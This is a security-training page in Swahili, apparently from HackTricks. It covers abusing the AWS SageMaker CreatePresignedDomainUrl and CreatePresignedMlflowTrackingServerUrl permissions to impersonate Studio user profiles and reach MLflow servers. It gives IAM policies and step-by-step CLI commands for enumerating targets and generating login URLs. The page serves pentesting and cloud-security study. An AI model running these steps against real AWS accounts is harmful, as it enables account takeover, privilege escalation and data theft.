# AWS - SageMaker Unauthorized Access

{{#include ../../../../banners/hacktricks-training.md}}

## SageMaker Studio - Account Takeover via CreatePresignedDomainUrl (Impersonate Any UserProfile)

### Maelezo
Kitambulisho chenye ruhusa ya kupiga simu `sagemaker:CreatePresignedDomainUrl` kwenye lengwa la Studio `UserProfile` kinaweza kutengeneza URL ya kuingia ambayo inaingia moja kwa moja ndani ya SageMaker Studio kama profile hiyo. Hii inampa kivinjari cha mshambulizi kikao cha Studio kinachorithi ruhusa za `ExecutionRole` za profile na ufikiaji kamili wa nyumbani na apps za profile zilizo kwenye EFS. Hakuna `iam:PassRole` au console access inahitajika.

### Mahitaji
- SageMaker Studio `Domain` na `UserProfile` lengwa ndani yake.
- Mhusika mshambulizi anahitaji `sagemaker:CreatePresignedDomainUrl` kwenye `UserProfile` lengwa (resourceâ€‘level) au `*`.

Mfano wa sera ya chini kabisa (iliyoelekezwa kwa UserProfile mmoja):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedDomainUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:user-profile/<domain-id>/<user-profile-name>"
}
]
}
```
### Hatua za Matumizi Mabaya

1) Orodhesha Studio Domain na UserProfiles unazoweza kulenga
```bash
DOM=$(aws sagemaker list-domains --query 'Domains[0].DomainId' --output text)
aws sagemaker list-user-profiles --domain-id-equals $DOM
TARGET_USER=<UserProfileName>
```
2) Tengeneza presigned URL (inayokuwa halali kwa takriban dakika 5 kwa chaguo-msingi)
```bash
aws sagemaker create-presigned-domain-url \
--domain-id $DOM \
--user-profile-name $TARGET_USER \
--query AuthorizedUrl --output text
```
3) Fungua URL iliyorejeshwa katika kivinjari ili kuingia kwenye Studio kama mtumiaji lengwa. Katika terminal ya Jupyter ndani ya Studio thibitisha kitambulisho cha ufanisi:
```bash
aws sts get-caller-identity
```
Vidokezo:
- `--landing-uri` inaweza kuachwa. Baadhi ya thamani (mfano, `app:JupyterLab:/lab`) zinaweza kukataliwa kulingana na toleo la Studio; chaguo-msingi kawaida hurudisha kwenye ukurasa wa nyumbani wa Studio kisha kwenda Jupyter.
- Sera za shirika/vizuizi vya VPC endpoint vinaweza bado kuzuia ufikiaji wa mtandao; kutengeneza tokeni hakuhitaji kuingia kwenye console au `iam:PassRole`.

### Athari
- Lateral movement and privilege escalation kwa kubadilisha kuwa yoyote Studio `UserProfile` ambayo ARN yake imeruhusiwa, ukirithi `ExecutionRole` yake na filesystem/apps yake.

### Ushahidi (kutoka kwenye jaribio lililodhibitiwa)
- Kwa kuwa na `sagemaker:CreatePresignedDomainUrl` pekee kwenye `UserProfile` lengwa, roli ya mshambuliaji ilirejesha kwa mafanikio `AuthorizedUrl` kama:
```
https://studio-d-xxxxxxxxxxxx.studio.<region>.sagemaker.aws/auth?token=eyJhbGciOi...
```
- Ombi la moja kwa moja la HTTP linajibiwa kwa kurudishwa (HTTP 302) kuelekea Studio, likithibitisha kuwa URL ni halali na hai hadi liishe muda wake.


## SageMaker MLflow Tracking Server - ATO via CreatePresignedMlflowTrackingServerUrl

### Maelezo
Shahsi mwenye idhini ya kuita `sagemaker:CreatePresignedMlflowTrackingServerUrl` kwa target SageMaker MLflow Tracking Server anaweza kutengeneza URL ya matumizi ya mara moja (presigned) inayothibitisha moja kwa moja kwenye UI iliyosimamiwa ya MLflow kwa server hiyo. Hii inampa ufikiaji sawa na mtumiaji halali angekuwa nao kwa server (kuona/kuunda experiments na runs, na kupakua/kupakia artifacts katika S3 artifact store ya server) bila ufikiaji wa console au `iam:PassRole`.

### Mahitaji
- SageMaker MLflow Tracking Server katika account/region na jina lake.
- Mshambuliaji (principal) anahitaji idhini ya `sagemaker:CreatePresignedMlflowTrackingServerUrl` kwenye rasilimali ya MLflow Tracking Server lengwa (au `*`).

Mfano wa sera ya chini kabisa (iliyopangwa kwa Tracking Server moja):
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sagemaker:CreatePresignedMlflowTrackingServerUrl",
"Resource": "arn:aws:sagemaker:<region>:<account-id>:mlflow-tracking-server/<tracking-server-name>"
}
]
}
```
### Hatua za Kutumia Vibaya

1) Orodhesha MLflow Tracking Servers unaoweza target na chagua jina moja
```bash
aws sagemaker list-mlflow-tracking-servers \
--query 'TrackingServerSummaries[].{Name:TrackingServerName,Status:TrackingServerStatus}'
TS_NAME=<tracking-server-name>
```
2) Tengeneza presigned MLflow UI URL (inayotumika kwa muda mfupi)
```bash
aws sagemaker create-presigned-mlflow-tracking-server-url \
--tracking-server-name "$TS_NAME" \
--expires-in-seconds 300 \
--session-expiration-duration-in-seconds 1800 \
--query AuthorizedUrl --output text
```
3) Fungua URL iliyorejeshwa kwenye kivinjari ili kufikia MLflow UI kama mtumiaji aliyethibitishwa kwa Tracking Server husika.

Vidokezo:
- Tracking Server lazima iwe katika hali ya tayari (mfano, `Created/Active`). Ikiwa bado iko `Creating`, ombi litakataliwa.
- The presigned URL ni ya matumizi mara moja na ni ya muda mfupi; tengeneza mpya inapohitajika.

### Athari
- Ufikiaji wa moja kwa moja wa MLflow UI iliyosimamiwa kwa Tracking Server lengwa, kuruhusu kutazama na kubadilisha experiments/runs na kupata au kupakia artifacts zilizohifadhiwa katika S3 artifact store iliyosanidiwa ya server, ndani ya ruhusa zinazotekelezwa na usanidi wa server.

{{#include ../../../../banners/hacktricks-training.md}}
